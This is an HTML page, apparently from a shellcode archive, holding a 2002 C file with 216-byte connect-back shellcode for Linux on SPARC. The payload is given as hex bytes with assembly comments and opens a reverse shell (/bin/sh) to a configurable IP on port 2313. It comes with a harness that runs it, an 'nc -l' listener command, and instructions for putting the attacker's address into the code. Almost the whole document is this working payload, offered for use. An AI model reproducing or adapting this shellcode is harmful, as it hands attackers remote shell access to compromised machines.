<html><head><title>Linux/sparc - connect back - 216 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* linux (sparc) connect back shellcode, because someone had to evade those firewalls. *sigh* */

/*
 * OS           : Linux
 * Architecture : Sparc
 * Type         : Connect Back
 * Lenght       : 216 Bytes
 * Listen-Port  : 2313/TCP
 * Default IP   : 192.168.100.1 ( see how you'll change it at the end. )
 *
 * null bytes (0x00), breaks (0x0a), nops, fork(), ... avoided.
 * was tested accordingly, couldn't optimized more.
 * plug it in your code, launch nc -l -vvv -p 2313 and wait for it.
 *
 * (c) 2002 killah @ hack . gr
 * All rights reserved.
 *
 */

#define NAME &quot;Linux Sparc Connect-Back&quot;

char cb_linux_sparc[]=
  &quot;\x9d\xe3\xbf\x80&quot;    // save  %sp, -128, %sp
  &quot;\x90\x10\x20\x02&quot;    // mov  2, %o0
  &quot;\xd0\x37\xbf\xe0&quot;    // sth  %o0, [ %fp + -32 ]
  &quot;\x90\x10\x29\x09&quot;    // mov  0x909, %o0
  &quot;\xd0\x37\xbf\xe2&quot;    // sth  %o0, [ %fp + -30 ]
  &quot;\x13\x30\x2a\x19&quot;    // sethi  %hi(0xc0a86400), %o1 &lt;- IPv4 ADDRESS MODIFY THIS.
  &quot;\x90\x12\x60\x01&quot;    // or  %o1, 1, %o0             &lt;- ALSO THIS.
  &quot;\xd0\x27\xbf\xe4&quot;    // st  %o0, [ %fp + -28 ]
  &quot;\x90\x10\x20\x02&quot;    // mov  2, %o0
  &quot;\x92\x10\x20\x01&quot;    // mov  1, %o1
  &quot;\x94\x22\x60\x01&quot;    // sub  %o1, 1, %o2
  &quot;\xd0\x23\xa0\x44&quot;    // st  %o0, [ %sp + 0x44 ]
  &quot;\xd2\x23\xa0\x48&quot;    // st  %o1, [ %sp + 0x48 ]
  &quot;\xd4\x23\xa0\x4c&quot;    // st  %o2, [ %sp + 0x4c ]
  &quot;\x90\x10\x20\x01&quot;    // mov  1, %o0
  &quot;\x92\x03\xa0\x44&quot;    // add  %sp, 0x44, %o1
  &quot;\x82\x10\x20\xce&quot;    // mov  0xce, %g1
  &quot;\x91\xd0\x20\x10&quot;    // ta  0x10
  &quot;\xd0\x27\xbf\xf4&quot;    // st  %o0, [ %fp + -12 ]
  &quot;\x92\x07\xbf\xe0&quot;    // add  %fp, -32, %o1
  &quot;\xd0\x07\xbf\xf4&quot;    // ld  [ %fp + -12 ], %o0
  &quot;\x94\x10\x20\x10&quot;    // mov  0x10, %o2
  &quot;\xd0\x23\xa0\x44&quot;    // st  %o0, [ %sp + 0x44 ]
  &quot;\xd2\x23\xa0\x48&quot;    // st  %o1, [ %sp + 0x48 ]
  &quot;\xd4\x23\xa0\x4c&quot;    // st  %o2, [ %sp + 0x4c ]
  &quot;\x90\x10\x20\x03&quot;    // mov  3, %o0
  &quot;\x92\x03\xa0\x44&quot;    // add  %sp, 0x44, %o1
  &quot;\x82\x10\x20\xce&quot;    // mov  0xce, %g1
  &quot;\x91\xd0\x20\x10&quot;    // ta  0x10
  &quot;\xd0\x07\xbf\xf4&quot;    // ld  [ %fp + -12 ], %o0
  &quot;\x92\x1a\x40\x09&quot;    // xor  %o1, %o1, %o1
  &quot;\x82\x10\x20\x5a&quot;    // mov  0x5a, %g1
  &quot;\x91\xd0\x20\x10&quot;    // ta  0x10
  &quot;\xd0\x07\xbf\xf4&quot;    // ld  [ %fp + -12 ], %o0
  &quot;\x92\x10\x20\x01&quot;    // mov  1, %o1
  &quot;\x82\x10\x20\x5a&quot;    // mov  0x5a, %g1
  &quot;\x91\xd0\x20\x10&quot;    // ta  0x10
  &quot;\xd0\x07\xbf\xf4&quot;    // ld  [ %fp + -12 ], %o0
  &quot;\x92\x10\x20\x02&quot;    // mov  2, %o1
  &quot;\x82\x10\x20\x5a&quot;    // mov  0x5a, %g1
  &quot;\x91\xd0\x20\x10&quot;    // ta  0x10
  &quot;\x2d\x0b\xd8\x9a&quot;    // sethi  %hi(0x2f626800), %l6
  &quot;\xac\x15\xa1\x6e&quot;    // or  %l6, 0x16e, %l6
  &quot;\x2f\x0b\xdc\xda&quot;    // sethi  %hi(0x2f736800), %l7
  &quot;\x90\x0b\x80\x0e&quot;    // and  %sp, %sp, %o0
  &quot;\x92\x03\xa0\x08&quot;    // add  %sp, 8, %o1
  &quot;\xa6\x10\x20\x01&quot;    // mov  1, %l3
  &quot;\x94\x24\xe0\x01&quot;    // sub  %l3, 1, %o2
  &quot;\x9c\x03\xa0\x10&quot;    // add  %sp, 0x10, %sp
  &quot;\xec\x3b\xbf\xf0&quot;    // std  %l6, [ %sp + -16 ]
  &quot;\xd0\x23\xbf\xf8&quot;    // st  %o0, [ %sp + -8 ]
  &quot;\xc0\x23\xbf\xfc&quot;    // clr  [ %sp + -4 ]
  &quot;\x82\x10\x20\x3b&quot;    // mov  0x3b, %g1
  &quot;\x91\xd0\x20\x10&quot;;   // ta  0x10

int
main()
{
  int (*test)();
  test = (int (*)()) cb_linux_sparc;
  printf(&quot;%s shellcode\n\tSize = %d\n&quot;,NAME,strlen(cb_linux_sparc));
  (int)(*test)();
  exit(0);
}

/*******************************************************************************

 here it is the C code, that will give you the IPv4 Address of your 
 box, in a big-endianess style, so to replace it inside shellcode and
 get the whole thing working for you.

 example:
  int main() { printf(&quot; 0x%02x%02x%02x%02x\n&quot;,192,168,100,1); exit(0); }
  or @ bash     printf &quot;0x%02x%02x%02x%02x\n&quot; 192 168 100 1

 i believe no further explanation needed.

********************************************************************************/

//EOF



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
